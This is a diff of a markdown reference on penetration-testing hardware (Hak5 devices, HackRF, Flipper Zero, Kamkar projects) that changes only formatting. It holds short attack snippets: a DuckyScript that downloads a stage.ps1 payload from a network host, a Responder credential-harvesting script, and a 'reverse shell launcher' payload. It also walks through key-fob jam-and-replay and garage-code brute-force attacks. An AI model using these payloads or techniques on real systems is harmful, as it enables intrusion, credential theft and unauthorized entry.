@@ -1,14 +1,14 @@
 # SECURITY GADGETS REFERENCE
 
-> **Professional cybersecurity reference covering security-focused hardware gadgets, maker tools, and DIY security devices.**
+> Professional cybersecurity reference covering security-focused hardware gadgets, maker tools, and DIY security devices.
 >
 > All information is provided for authorized security research, penetration testing, and educational purposes only. Always obtain explicit written authorization before testing on any systems you do not own. Unauthorized use of these tools may violate the Computer Fraud and Abuse Act (18 U.S.C. § 1030), FCC regulations, and other applicable laws.
 
 | | |
 |---|---|
-| **Read this when** | Scoping an authorized wireless, RF, RFID, or hardware assessment and choosing the right gadget, standing up an isolated home lab or RF test bench, confirming the legal boundaries before you power on a transmitter |
-| **Start at** | [Hak5 Ecosystem](#_1-hak5-ecosystem), [Flipper Zero](#_3-flipper-zero), [Lab Setup, Legal & Community](#_10-lab-setup-legal-amp-community) |
-| **Pairs with** | [WIRELESS_SECURITY_REFERENCE.md](WIRELESS_SECURITY_REFERENCE.md), [RED_TEAM_REFERENCE.md](RED_TEAM_REFERENCE.md), [disciplines/radio-frequency-security.md](disciplines/radio-frequency-security.md), [disciplines/hardware-security.md](disciplines/hardware-security.md) |
+| Read this when | Scoping an authorized wireless, RF, RFID, or hardware assessment and choosing the right gadget, standing up an isolated home lab or RF test bench, confirming the legal boundaries before you power on a transmitter |
+| Start at | [Hak5 Ecosystem](#_1-hak5-ecosystem), [Flipper Zero](#_3-flipper-zero), [Lab Setup, Legal & Community](#_10-lab-setup-legal-amp-community) |
+| Pairs with | [WIRELESS_SECURITY_REFERENCE.md](WIRELESS_SECURITY_REFERENCE.md), [RED_TEAM_REFERENCE.md](RED_TEAM_REFERENCE.md), [disciplines/radio-frequency-security.md](disciplines/radio-frequency-security.md), [disciplines/hardware-security.md](disciplines/hardware-security.md) |
 
 ---
 
@@ -35,18 +35,18 @@ Hak5 produces a professional-grade line of penetration testing hardware used by 
 
 The WiFi Pineapple Mark VII is a dual-radio 802.11 a/b/g/n/ac platform designed for wireless security assessments. It runs a custom OpenWrt-based firmware with a web-based management interface.
 
-**Core Modules:**
+Core Modules:
 
-- **PineAP** — The primary rogue access point engine. Broadcasts SSIDs harvested from probe requests, enabling authorized testing of client association behavior. Configurable beacon interval, TX power, and MAC address.
-- **Evil Portal** — Captive portal module for authorized phishing simulations. Supports custom HTML/PHP portal pages, credential logging, and automatic client redirection.
-- **SSLsplit** — Transparent TLS/SSL proxy for authorized MITM assessments. Intercepts encrypted sessions and logs plaintext for analysis.
-- **DNSspoof** — DNS spoofing module for authorized redirect testing. Maps queried hostnames to attacker-controlled IPs.
-- **REST API** — Full device management via JSON REST API. Enables scripted automation of campaigns, module control, and log retrieval.
-- **Cloud C2 Integration** — Remote management via Hak5's Cloud C2 platform. Supports device tunneling, payload deployment, and loot retrieval over internet-routed connections.
+- PineAP: The primary rogue access point engine. Broadcasts SSIDs harvested from probe requests, enabling authorized testing of client association behavior. Configurable beacon interval, TX power, and MAC address.
+- Evil Portal: Captive portal module for authorized phishing simulations. Supports custom HTML/PHP portal pages, credential logging, and automatic client redirection.
+- SSLsplit: Transparent TLS/SSL proxy for authorized MITM assessments. Intercepts encrypted sessions and logs plaintext for analysis.
+- DNSspoof: DNS spoofing module for authorized redirect testing. Maps queried hostnames to attacker-controlled IPs.
+- REST API: Full device management via JSON REST API. Enables scripted automation of campaigns, module control, and log retrieval.
+- Cloud C2 Integration: Remote management via Hak5's Cloud C2 platform. Supports device tunneling, payload deployment, and loot retrieval over internet-routed connections.
 
-**WiFi Coconut** — A companion device featuring 14 simultaneous 2.4 GHz radios, enabling full-band 802.11 capture across all channels simultaneously. Used with Kismet for comprehensive wireless spectrum monitoring during authorized assessments.
+WiFi Coconut — A companion device featuring 14 simultaneous 2.4 GHz radios, enabling full-band 802.11 capture across all channels simultaneously. Used with Kismet for comprehensive wireless spectrum monitoring during authorized assessments.
 
-**Operational workflow:**
+Operational workflow:
 ```
 1. Connect to Pineapple management AP (172.16.42.1)
 2. Configure PineAP: enable beacon flood, set SSID pool
@@ -59,7 +59,7 @@ The WiFi Pineapple Mark VII is a dual-radio 802.11 a/b/g/n/ac platform designed 
 
 The USB Rubber Ducky is a keystroke injection tool that presents as a USB HID keyboard, executing scripted payloads at machine speed the moment it is plugged in.
 
-**DuckyScript Language:**
+DuckyScript Language:
 
 | Command | Description | Example |
 |---------|-------------|---------|
@@ -74,7 +74,7 @@ The USB Rubber Ducky is a keystroke injection tool that presents as a USB HID ke
 | `REPEAT` | Repeat previous line | `REPEAT 5` |
 | `DEFAULT_DELAY` | Set global delay | `DEFAULT_DELAY 100` |
 
-**Example payload — open Run dialog and execute command:**
+Example payload — open Run dialog and execute command:
 ```ducky
 DELAY 1000
 GUI r
@@ -86,17 +86,17 @@ STRING Invoke-WebRequest -Uri http://192.168.1.10/stage.ps1 -OutFile $env:TEMP\s
 ENTER
 ```
 
-**Twin Duck Firmware** — Modified firmware enabling simultaneous HID and mass storage modes. The device appears as both a keyboard and a USB flash drive, allowing payload delivery combined with file exfiltration.
+Twin Duck Firmware — Modified firmware enabling simultaneous HID and mass storage modes. The device appears as both a keyboard and a USB flash drive, allowing payload delivery combined with file exfiltration.
 
-**Payload Studio** — Browser-based IDE at payloadstudio.hak5.org for authoring, testing, and encoding DuckyScript payloads. Features syntax highlighting, error checking, and direct device flashing.
+Payload Studio — Browser-based IDE at payloadstudio.hak5.org for authoring, testing, and encoding DuckyScript payloads. Features syntax highlighting, error checking, and direct device flashing.
 
-**Community Payloads:** `github.com/hak5/usbrubberducky-payloads` — curated repository of community-contributed payloads organized by OS and attack category.
+Community Payloads: `github.com/hak5/usbrubberducky-payloads` — curated repository of community-contributed payloads organized by OS and attack category.
 
 ### 1.3 Bash Bunny
 
 The Bash Bunny is a multi-function USB attack platform running a full Debian Linux environment, capable of appearing as various USB device types simultaneously.
 
-**ATTACKMODE Configuration:**
+ATTACKMODE Configuration:
 
 ```bash
 # Appear as HID keyboard + mass storage
@@ -112,7 +112,7 @@ ATTACKMODE ECM_ETHERNET STORAGE
 ATTACKMODE HID
 ```
 
-**Bunny Script structure:**
+Bunny Script structure:
 ```bash
 #!/bin/bash
 # payloads/switch1/payload.sh
@@ -129,9 +129,9 @@ python Responder.py -I usb0 -wrf
 cp /tmp/Responder-Session.log /root/udisk/loot/
 ```
 
-**Pre-installed tools:** `responder`, `nmap`, `impacket`, `metasploit` (framework), `tcpdump`, `python3`, `curl`, `wget`
+Pre-installed tools: `responder`, `nmap`, `impacket`, `metasploit` (framework), `tcpdump`, `python3`, `curl`, `wget`
 
-**LED Status Codes:**
+LED Status Codes:
 
 | Color/Pattern | Meaning |
 |--------------|---------|
@@ -142,21 +142,21 @@ cp /tmp/Responder-Session.log /root/udisk/loot/
 | Solid Blue | Finished |
 | Flashing Magenta | Error |
 
-**Switch positions:** Switch 1, Switch 2 (attack payloads), Switch 3 (arming mode for payload editing via mass storage).
+Switch positions: Switch 1, Switch 2 (attack payloads), Switch 3 (arming mode for payload editing via mass storage).
 
 ### 1.4 Shark Jack
 
 The Shark Jack is an inline network attack tool designed to auto-execute payloads when connected to a live network port.
 
-- Runs **OpenWrt** on internal MIPS processor
-- **Auto-attack on plug** — configured payload executes immediately upon detecting link-up
-- **Loot storage** — internal storage for captured credentials, scan results, and network data
-- **Cloud C2** integration for remote payload delivery and loot retrieval
-- Built-in **nmap** for rapid network reconnaissance
+- Runs OpenWrt on internal MIPS processor
+- Auto-attack on plug: configured payload executes immediately upon detecting link-up
+- Loot storage: internal storage for captured credentials, scan results, and network data
+- Cloud C2 integration for remote payload delivery and loot retrieval
+- Built-in nmap for rapid network reconnaissance
 - Battery-powered for untethered deployment
 - RJ45 jack doubles as charging interface
 
-**Example payload:**
+Example payload:
 ```bash
 #!/bin/bash
 # Network recon on plug
@@ -168,34 +168,34 @@ nmap -sV -O $(cat /root/loot/hosts.xml | grep -oP 'addr="\K[^"]+') -oN /root/loo
 
 The LAN Turtle is a covert USB Ethernet adapter that provides persistent remote access and network intelligence gathering when deployed in authorized environments.
 
-- **USB Ethernet disguise** — appears as a standard USB Ethernet adapter to the host OS
-- Runs **OpenWrt** with modular architecture
-- **Available modules:**
-  - `autossh` — persistent reverse SSH tunnel to remote server
-  - `meterpreter` — Metasploit Meterpreter reverse shell
-  - `responder` — SMB/HTTP credential harvesting (authorized)
-  - `nmap` — network scanning and discovery
-  - `Cloud C2` — Hak5 remote management integration
-  - `DNSspoof` — local DNS manipulation
-  - `Mitmf` — man-in-the-middle framework
-- Powered entirely by host USB port — no external power required
+- USB Ethernet disguise: appears as a standard USB Ethernet adapter to the host OS
+- Runs OpenWrt with modular architecture
+- Available modules:
+  - `autossh`: persistent reverse SSH tunnel to remote server
+  - `meterpreter`: Metasploit Meterpreter reverse shell
+  - `responder`: SMB/HTTP credential harvesting (authorized)
+  - `nmap`: network scanning and discovery
+  - `Cloud C2`: Hak5 remote management integration
+  - `DNSspoof`: local DNS manipulation
+  - `Mitmf`: man-in-the-middle framework
+- Powered entirely by host USB port: no external power required
 - Web-based module management interface via SSH tunnel
 
 ### 1.6 Packet Squirrel
 
 The Packet Squirrel is a transparent Layer 2 network tap and MITM device designed for authorized inline network monitoring.
 
-- **Layer 2 transparent tap** — passes traffic without disrupting network communication
-- **Inline deployment** — sits between two network devices, invisible to both
-- Runs **OpenWrt** with configurable payloads
-- **4-position payload switch** for field-selectable attack modes
-- **Built-in tools:** `tcpdump`, `nmap`, `openvpn`, `dnsspoof`
-- **VPN mode** — routes captured traffic through encrypted tunnel for remote analysis
-- **DNS spoofing** mode — modifies DNS responses in-flight for authorized redirect testing
+- Layer 2 transparent tap: passes traffic without disrupting network communication
+- Inline deployment: sits between two network devices, invisible to both
+- Runs OpenWrt with configurable payloads
+- 4-position payload switch for field-selectable attack modes
+- Built-in tools: `tcpdump`, `nmap`, `openvpn`, `dnsspoof`
+- VPN mode: routes captured traffic through encrypted tunnel for remote analysis
+- DNS spoofing mode: modifies DNS responses in-flight for authorized redirect testing
 - Loot written to USB mass storage
 - Passive monitoring mode for no-modification traffic capture
 
-**Capture example:**
+Capture example:
 ```bash
 tcpdump -i eth0 -w /root/udisk/capture-$(date +%Y%m%d-%H%M%S).pcap
 ```
@@ -204,14 +204,14 @@ tcpdump -i eth0 -w /root/udisk/capture-$(date +%Y%m%d-%H%M%S).pcap
 
 The Key Croc is a USB keyboard pass-through implant that captures keystrokes and can inject HID payloads triggered by specific keywords.
 
-- **USB keyboard pass-through** — the connected keyboard continues to function normally
-- **Loot logger** — captures all keystrokes to local storage
-- **Keyword-triggered HID injection** — monitors keystroke stream for defined trigger words, then injects DuckyScript payload
-- Built-in **WiFi** for remote C2 communication
-- **Cloud C2** integration for remote management
+- USB keyboard pass-through: the connected keyboard continues to function normally
+- Loot logger: captures all keystrokes to local storage
+- Keyword-triggered HID injection: monitors keystroke stream for defined trigger words, then injects DuckyScript payload
+- Built-in WiFi for remote C2 communication
+- Cloud C2 integration for remote management
 - Runs Debian Linux with Python support
 
-**Keyword trigger example:**
+Keyword trigger example:
 ```
 WHEN [any] CONTAINS "cmd" EXECUTE payload.txt
 ```
@@ -220,17 +220,17 @@ WHEN [any] CONTAINS "cmd" EXECUTE payload.txt
 
 The O.MG Cable is a USB cable with an embedded WiFi-enabled microcontroller, visually indistinguishable from standard charging cables.
 
-**Available variants:**
+Available variants:
 - Lightning to USB-A
 - USB-A to USB-A
 - USB-C to USB-C and cross-variants
 
-**Capabilities:**
-- **WiFi AP** — device creates its own WiFi access point for remote operator control
-- **DuckyScript** execution — full keystroke injection capability
-- **Geofencing** — payloads activate or deactivate based on GPS/WiFi location triggers
-- **Self-destruct** — remote wipe of all payload data to prevent forensic recovery
-- **Keystroke exfiltration** — logs keystrokes over WiFi in real-time
+Capabilities:
+- WiFi AP: device creates its own WiFi access point for remote operator control
+- DuckyScript execution: full keystroke injection capability
+- Geofencing: payloads activate or deactivate based on GPS/WiFi location triggers
+- Self-destruct: remote wipe of all payload data to prevent forensic recovery
+- Keystroke exfiltration: logs keystrokes over WiFi in real-time
 - Web-based control panel accessible via connected WiFi
 
 ### 1.9 Screen Crab
@@ -238,19 +238,19 @@ The O.MG Cable is a USB cable with an embedded WiFi-enabled microcontroller, vis
 The Screen Crab is an inline HDMI capture device for authorized video signal monitoring.
 
 - Passes HDMI signal transparently between source and display
-- Captures screen content to **microSD card** at configurable frame rates
-- **WiFi exfiltration** — streams or uploads captures to remote server
+- Captures screen content to microSD card at configurable frame rates
+- WiFi exfiltration: streams or uploads captures to remote server
 - Powered by HDMI's 5V supply line or USB-C auxiliary
 - Used in authorized physical security assessments for screen content capture
 
 ### 1.10 Cloud C2
 
-Hak5's **Cloud C2** is a self-hosted remote management platform for centrally managing all Hak5 devices in authorized deployments.
+Hak5's Cloud C2 is a self-hosted remote management platform for centrally managing all Hak5 devices in authorized deployments.
 
 - Unified dashboard for WiFi Pineapple, Bash Bunny, LAN Turtle, Shark Jack, Key Croc, Packet Squirrel
-- **Device tunneling** — establishes outbound connections through NAT/firewall for remote access
-- **Payload delivery** — push and execute payloads on deployed devices
-- **Loot retrieval** — centralized collection of captured data from all devices
+- Device tunneling: establishes outbound connections through NAT/firewall for remote access
+- Payload delivery: push and execute payloads on deployed devices
+- Loot retrieval: centralized collection of captured data from all devices
 - Self-hosted on VPS or local server: `./c2-3.0.0_amd64_linux -hostname yourdomain.com -https`
 - REST API for automation and SIEM integration
 
@@ -263,15 +263,15 @@ Great Scott Gadgets develops open-source hardware for RF and hardware security r
 
 The HackRF One is a software-defined radio peripheral supporting half-duplex transmit and receive across an extremely wide frequency range.
 
-**Hardware specifications:**
-- **Frequency range:** 1 MHz - 6 GHz
-- **Sample rate:** 20 Msps (20 million samples per second)
-- **ADC resolution:** 8-bit
-- **Duplex:** Half-duplex (transmit OR receive, not simultaneous)
-- **Interface:** USB 2.0 High Speed
-- **Form factor:** Open-source hardware, SMA antenna connector
+Hardware specifications:
+- Frequency range: 1 MHz - 6 GHz
+- Sample rate: 20 Msps (20 million samples per second)
+- ADC resolution: 8-bit
+- Duplex: Half-duplex (transmit OR receive, not simultaneous)
+- Interface: USB 2.0 High Speed
+- Form factor: Open-source hardware, SMA antenna connector
 
-**Essential CLI commands:**
+Essential CLI commands:
 
 ```bash
 # Identify connected HackRF device
@@ -293,7 +293,7 @@ hackrf_sweep -f 100:6000 -l 16 -g 0 -n 8192
 hackrf_transfer -t ook_signal.bin -f 315000000 -s 2000000 -x 47 -a 1
 ```
 
-**GNU Radio integration:**
+GNU Radio integration:
 ```python
 # Basic HackRF source in GNU Radio Python
 from gnuradio import gr
@@ -311,34 +311,34 @@ class HackRFReceiver(gr.top_block):
         self.connect(self.src, self.sink)
 ```
 
-**Portapack H2 + Mayhem Firmware:**
+Portapack H2 + Mayhem Firmware:
 
 The Portapack H2 is a companion screen/battery/controls module that attaches to the HackRF One, creating a standalone (no-computer-required) SDR platform.
 
 Mayhem firmware (`github.com/portapack-mayhem/mayhem-firmware`) features:
-- **Spectrum Analyzer** — real-time waterfall display across any frequency range
-- **Receiver** — AM/FM/SSB/DSB/WFM demodulation with audio output
-- **Transmitter** — replay captured signals, custom waveforms
-- **Jammer Detector** — identifies broadband noise sources (for authorized RF testing)
-- **POCSAG Decoder** — decodes paging system transmissions
-- **ADS-B Receiver** — aircraft transponder tracking and display
-- **BTLE Receiver** — Bluetooth Low Energy packet capture
-- **Weather Station Receiver** — 433 MHz ISM band sensor decoding
-- **Sub-GHz replay** — capture and replay remote controls and sensors
-- **GPS Simulator** — GPS satellite signal simulation (requires authorization and RF shielding)
+- Spectrum Analyzer: real-time waterfall display across any frequency range
+- Receiver: AM/FM/SSB/DSB/WFM demodulation with audio output
+- Transmitter: replay captured signals, custom waveforms
+- Jammer Detector: identifies broadband noise sources (for authorized RF testing)
+- POCSAG Decoder: decodes paging system transmissions
+- ADS-B Receiver: aircraft transponder tracking and display
+- BTLE Receiver: Bluetooth Low Energy packet capture
+- Weather Station Receiver: 433 MHz ISM band sensor decoding
+- Sub-GHz replay: capture and replay remote controls and sensors
+- GPS Simulator: GPS satellite signal simulation (requires authorization and RF shielding)
 
 ### 2.2 YARD Stick One
 
 The YARD Stick One is a Sub-GHz radio transceiver based on the TI CC1111 SoC, designed for ISM band protocol analysis and authorized testing.
 
-**Specifications:**
-- **Frequency range:** 300 - 928 MHz (Sub-GHz ISM bands)
-- **Chipset:** Texas Instruments CC1111
-- **Modulations:** OOK, ASK, 2-FSK, GFSK, MSK
-- **Interface:** USB
-- **Library:** rfcat Python library
+Specifications:
+- Frequency range: 300 - 928 MHz (Sub-GHz ISM bands)
+- Chipset: Texas Instruments CC1111
+- Modulations: OOK, ASK, 2-FSK, GFSK, MSK
+- Interface: USB
+- Library: rfcat Python library
 
-**rfcat usage:**
+rfcat usage:
 
 ```python
 from rfcat import RfCat
@@ -369,7 +369,7 @@ d.specan(433000000)          # Launch spectrum analyzer
 d.cleanup()
 ```
 
-**ISM band frequency reference:**
+ISM band frequency reference:
 
 | Band | Frequency | Common Uses |
 |------|-----------|-------------|
@@ -382,13 +382,13 @@ d.cleanup()
 
 The Ubertooth One is an open-source Bluetooth monitoring platform providing promiscuous capture capability for both Classic Bluetooth (BR/EDR) and Bluetooth Low Energy (BLE).
 
-**Specifications:**
-- **Frequency:** 2.4 GHz ISM band (2402-2480 MHz)
-- **Chipset:** Texas Instruments CC2400
-- **Interface:** USB
-- **Protocol support:** BR/EDR (Classic Bluetooth), BLE (Bluetooth Low Energy)
+Specifications:
+- Frequency: 2.4 GHz ISM band (2402-2480 MHz)
+- Chipset: Texas Instruments CC2400
+- Interface: USB
+- Protocol support: BR/EDR (Classic Bluetooth), BLE (Bluetooth Low Energy)
 
-**Commands:**
+Commands:
 
 ```bash
 # Capture BLE advertising packets to pcap
@@ -411,7 +411,7 @@ ubertooth-btle -f -p | wireshark -k -i -
 crackle -i pairing_capture.pcap -o decrypted.pcap
 ```
 
-**Bluetooth security research applications:**
+Bluetooth security research applications:
 - Authorized device enumeration and fingerprinting
 - BLE advertisement monitoring for IoT device discovery
 - BLE MITM setup for authorized protocol analysis
@@ -422,14 +422,14 @@ crackle -i pairing_capture.pcap -o decrypted.pcap
 
 The GreatFET One is a versatile hardware hacking Swiss army knife based on the NXP LPC4330 dual-core ARM processor.
 
-**Specifications:**
-- **Processor:** NXP LPC4330 (ARM Cortex-M4 + M0)
-- **Interface:** USB 2.0 High Speed
-- **GPIO:** 40-pin expansion headers compatible with Raspberry Pi HATs
-- **Special capability:** Can operate as USB host and USB device simultaneously
-- **Neighbor boards:** Modular expansion boards (JTAG, SPI flash, ADC, DAC, etc.)
+Specifications:
+- Processor: NXP LPC4330 (ARM Cortex-M4 + M0)
+- Interface: USB 2.0 High Speed
+- GPIO: 40-pin expansion headers compatible with Raspberry Pi HATs
+- Special capability: Can operate as USB host and USB device simultaneously
+- Neighbor boards: Modular expansion boards (JTAG, SPI flash, ADC, DAC, etc.)
 
-**Python API:**
+Python API:
 
 ```python
 from greatfet import GreatFET
@@ -453,7 +453,7 @@ gpio.output('J1_P5', True)
 from facedancer import FacedancerUSBApp
 ```
 
-**FaceDancer functionality (USB fuzzing):**
+FaceDancer functionality (USB fuzzing):
 ```python
 # Emulate a USB device for fuzzing and analysis
 from facedancer import FacedancerUSBApp
@@ -465,9 +465,9 @@ from facedancer.USBDevice import USBDevice
 
 The Throwing Star LAN Tap is a passive, unpowered network monitoring device for capturing 100BASE-TX Ethernet traffic.
 
-- **Completely passive** — requires no power, introduces no traffic
+- Completely passive: requires no power, introduces no traffic
 - Splits receive (RX) pairs from both sides to two monitoring ports
-- Rated for **100 Mbps** only (100BASE-TX); does not support Gigabit
+- Rated for 100 Mbps only (100BASE-TX); does not support Gigabit
 - Plugs between two Ethernet devices (e.g., workstation and switch)
 - Monitor ports output receive-only traffic (one direction per port)
 - Use a NIC in promiscuous mode on each monitor port, or combine with a hub for full-duplex capture
@@ -489,7 +489,7 @@ Flipper Zero is a portable multi-tool for security researchers, combining radio,
 
 ### 3.1 Hardware Overview
 
-**Core specifications:**
+Core specifications:
 
 | Component | Details |
 |-----------|---------|
@@ -511,12 +511,12 @@ Flipper Zero is a portable multi-tool for security researchers, combining radio,
 
 Flipper's Sub-GHz module uses the TI CC1101 chip to receive, decode, save, and replay fixed-code radio signals in the 300-928 MHz range.
 
-**Supported frequencies:**
+Supported frequencies:
 - 315 MHz, 390 MHz (US/Japan)
 - 433.92 MHz (EU/worldwide ISM)
 - 868.35 MHz, 915 MHz (regional)
 
-**Supported protocols:**
+Supported protocols:
 
 | Protocol | Description |
 |----------|-------------|
@@ -529,7 +529,7 @@ Flipper's Sub-GHz module uses the TI CC1101 chip to receive, decode, save, and r
 | CAME | Rolling code (can capture, cannot replay without key) |
 | KeeLoq | Rolling code algorithm (vulnerable to certain attacks) |
 
-**Sub-GHz file format (.sub):**
+Sub-GHz file format (.sub):
 ```
 Filetype: Flipper SubGhz Key File
 Version: 1
@@ -540,15 +540,15 @@ Bit: 24
 Key: 00 00 00 00 00 AB CD 12
 ```
 
-**Frequency analyzer** mode displays signal power across the Sub-GHz spectrum in real-time, enabling quick identification of active frequencies.
+Frequency analyzer mode displays signal power across the Sub-GHz spectrum in real-time, enabling quick identification of active frequencies.
 
-**RAW capture and replay:** Records the raw OOK/FSK waveform without protocol decoding — useful for protocols Flipper does not natively support. Replays the exact recorded waveform.
+RAW capture and replay: Records the raw OOK/FSK waveform without protocol decoding — useful for protocols Flipper does not natively support. Replays the exact recorded waveform.
 
-**Region unlock:** Default firmware enforces regional frequency restrictions. Community firmware (Unleashed, Momentum) removes these restrictions for testing in authorized environments.
+Region unlock: Default firmware enforces regional frequency restrictions. Community firmware (Unleashed, Momentum) removes these restrictions for testing in authorized environments.
 
 ### 3.3 RFID and NFC
 
-**125 kHz RFID (Low Frequency):**
+125 kHz RFID (Low Frequency):
 
 | Card Type | Read | Write | Emulate |
 |-----------|------|-------|---------|
@@ -558,7 +558,7 @@ Key: 00 00 00 00 00 AB CD 12
 | EM4305 | Yes | Yes | Yes |
 | T5577 | Yes | Yes | Yes |
 
-**13.56 MHz NFC (High Frequency):**
+13.56 MHz NFC (High Frequency):
 
 | Card Type | Read | Write | Emulate |
 |-----------|------|-------|---------|
@@ -570,9 +570,9 @@ Key: 00 00 00 00 00 AB CD 12
 
 *Mifare Classic requires knowing the sector keys. Flipper supports nested authentication attacks to recover unknown keys from a partially known card.
 
-**NFC dictionary attack:** Flipper can perform nested authentication attacks against Mifare Classic cards, attempting to recover all sector keys using known keys as a starting point. Community firmware expands the built-in key dictionary.
+NFC dictionary attack: Flipper can perform nested authentication attacks against Mifare Classic cards, attempting to recover all sector keys using known keys as a starting point. Community firmware expands the built-in key dictionary.
 
-**RFID file format (.rfid):**
+RFID file format (.rfid):
 ```
 Filetype: Flipper RFID key
 Version: 1
@@ -584,9 +584,9 @@ Data: 01 23 45 67 89
 
 Flipper Zero presents as a USB HID keyboard when connected to a host, executing DuckyScript 1.0 payloads from the MicroSD card.
 
-**Compatibility:** Windows, macOS, Linux, Android (USB OTG)
+Compatibility: Windows, macOS, Linux, Android (USB OTG)
 
-**DuckyScript example (Windows reverse shell launcher):**
+DuckyScript example (Windows reverse shell launcher):
 ```ducky
 DELAY 3000
 GUI r
@@ -598,21 +598,21 @@ STRING Start-Process cmd -ArgumentList '/c whoami > C:\temp\out.txt' -WindowStyl
 ENTER
 ```
 
-**Payload storage:** `/SD Card/badusb/` — `.txt` files with DuckyScript syntax
+Payload storage: `/SD Card/badusb/` — `.txt` files with DuckyScript syntax
 
-**Key limitations vs. USB Rubber Ducky:** No multi-stage delivery (single script only), limited to DuckyScript 1.0 syntax, type speed may vary by OS language/layout.
+Key limitations vs. USB Rubber Ducky: No multi-stage delivery (single script only), limited to DuckyScript 1.0 syntax, type speed may vary by OS language/layout.
 
 ### 3.5 Infrared
 
 Flipper Zero includes an IR transmitter and receiver for universal remote control functionality.
 
-- **Learn** — captures IR signals from existing remotes (NEC, RC5, RC6, SIRC, and raw protocols)
-- **Replay** — retransmits captured signals
-- **IRDB** — community-maintained IR code database for TVs, projectors, A/V receivers, and smart home devices
-- **Universal remote** — pre-loaded codes for major TV brands
+- Learn: captures IR signals from existing remotes (NEC, RC5, RC6, SIRC, and raw protocols)
+- Replay: retransmits captured signals
+- IRDB: community-maintained IR code database for TVs, projectors, A/V receivers, and smart home devices
+- Universal remote: pre-loaded codes for major TV brands
 - RAW capture mode for non-standard protocols
 
-**Community IRDB:** `github.com/Lucaslhm/Flipper-IRDB` — thousands of device code files in `.ir` format
+Community IRDB: `github.com/Lucaslhm/Flipper-IRDB` — thousands of device code files in `.ir` format
 
 ### 3.6 iButton (1-Wire)
 
@@ -622,24 +622,24 @@ Flipper reads and emulates Dallas/Maxim iButton keys (DS1990A, DS1992) used in p
 
 | Firmware | Key Features |
 |----------|-------------|
-| **Official** | Stable, region-compliant, frequent updates |
-| **Unleashed** | Region unlock, extra Sub-GHz protocols, extended RFID support |
-| **RogueMaster** | Unleashed base + additional apps, visual tweaks |
-| **Momentum** | Performance-focused, clean UI, curated app store |
+| Official | Stable, region-compliant, frequent updates |
+| Unleashed | Region unlock, extra Sub-GHz protocols, extended RFID support |
+| RogueMaster | Unleashed base + additional apps, visual tweaks |
+| Momentum | Performance-focused, clean UI, curated app store |
 
-**GPIO WiFi Dev Board:** An ESP32-based add-on connecting to Flipper's GPIO header. Running the **Marauder** firmware, it enables:
+GPIO WiFi Dev Board: An ESP32-based add-on connecting to Flipper's GPIO header. Running the Marauder firmware, it enables:
 - WiFi network scanning
 - Authorized deauthentication frame testing
 - Evil twin AP setup
 - Beacon flood testing
 - Packet capture (PCAP)
 
-**Flipper App Marketplace:** `lab.flipper.net/apps` — community applications including games, tools, and protocol analyzers installable via Flipper Mobile App.
+Flipper App Marketplace: `lab.flipper.net/apps` — community applications including games, tools, and protocol analyzers installable via Flipper Mobile App.
 
-**Community resources:**
-- `github.com/djsime1/awesome-flipperzero` — curated resources list
-- `github.com/UberGuidoZ/Flipper` — payload and file repository
-- `flipper-zero-tutorials` — video and written guides
+Community resources:
+- `github.com/djsime1/awesome-flipperzero`: curated resources list
+- `github.com/UberGuidoZ/Flipper`: payload and file repository
+- `flipper-zero-tutorials`: video and written guides
 
 ---
 ## 4. Samy Kamkar Projects
@@ -650,141 +650,141 @@ Samy Kamkar is a security researcher and prolific creator of open-source hardwar
 
 MagSpoof wirelessly emulates any magnetic stripe card without physical contact by generating an electromagnetic field that mimics the card's data encoding.
 
-**Hardware:** ATmega microcontroller + H-bridge motor driver + coil (approximately 25 turns of 30 AWG magnet wire)
+Hardware: ATmega microcontroller + H-bridge motor driver + coil (approximately 25 turns of 30 AWG magnet wire)
 
-**How it works:**
+How it works:
 1. Data is encoded in the magnetic field using F2F (frequency/double frequency) encoding
 2. The H-bridge rapidly switches current direction through the coil
 3. The resulting alternating magnetic field is read by standard mag-stripe readers
 4. Works at close range (1-3 cm) without any physical card present
 
-**Security research relevance:**
+Security research relevance:
 - Demonstrates the weakness of magnetic stripe authentication
 - Tests reader compatibility and sensitivity
 - Can disable the chip requirement on some readers that fall back to swipe
 - Exposes the lack of cryptographic protection on Track 1/2/3 data
 
-**Open-source:** `github.com/samyk/magspoof`
+Open-source: `github.com/samyk/magspoof`
 
 ### 4.2 RollJam
 
 RollJam exploits a critical vulnerability in rolling code (KeeLoq) systems used by many car key fobs and garage door openers from manufacturers including GM, Chrysler, Volkswagen, and others.
 
-**Attack sequence:**
-1. **Jam + Capture #1:** When the vehicle owner presses their key fob, RollJam simultaneously jams the signal (preventing the car from receiving it) and captures the rolling code
-2. **Jam + Capture #2:** Owner presses again (assumes malfunction) — device captures second rolling code while continuing to jam
-3. **Replay #1:** Immediately replays the first captured code — car unlocks (owner satisfied)
-4. **Hold #2:** Second captured code is valid but unused — stored for future replay when attacker needs unauthorized access
+Attack sequence:
+1. Jam + Capture #1: When the vehicle owner presses their key fob, RollJam simultaneously jams the signal (preventing the car from receiving it) and captures the rolling code
+2. Jam + Capture #2: Owner presses again (assumes malfunction): device captures second rolling code while continuing to jam
+3. Replay #1: Immediately replays the first captured code: car unlocks (owner satisfied)
+4. Hold #2: Second captured code is valid but unused: stored for future replay when attacker needs unauthorized access
 
-**Why this works:** Rolling code systems advance their counter on each use. By capturing two codes and using the first, the attacker holds a still-valid future code.
+Why this works: Rolling code systems advance their counter on each use. By capturing two codes and using the first, the attacker holds a still-valid future code.
 
-**Hardware options:**
+Hardware options:
 - HackRF One (broadband SDR)
 - YARD Stick One (Sub-GHz dedicated)
 - Custom PCB with dual CC1101 chips (simultaneous jam/receive)
 
-**Mitigations:** Unidirectional rolling code with time-based expiry, bi-directional challenge-response authentication (not present in most consumer vehicles).
+Mitigations: Unidirectional rolling code with time-based expiry, bi-directional challenge-response authentication (not present in most consumer vehicles).
 
-**Open-source:** `github.com/samyk/rolljam`
+Open-source: `github.com/samyk/rolljam`
 
 ### 4.3 OpenSesame
 
 OpenSesame is a brute-force tool targeting garage door openers that use fixed (non-rolling) codes.
 
-**Attack parameters:**
+Attack parameters:
 - Code space: 2^12 = 4,096 possible codes (older systems) or 2^9 = 512 (some models)
 - Transmission rate: approximately 10 ms per code attempt
 - Total time for exhaustive search: approximately 40 seconds
 - Target: Fixed-code garage door openers (pre-rolling-code era, still common)
 
-**Platform:** HackRF One transmitting OOK-modulated signals at the target frequency (300 MHz, 310 MHz, or 315 MHz depending on the opener).
+Platform: HackRF One transmitting OOK-modulated signals at the target frequency (300 MHz, 310 MHz, or 315 MHz depending on the opener).
 
-**Defense:** All modern openers should use rolling codes. Fixed-code systems should be replaced.
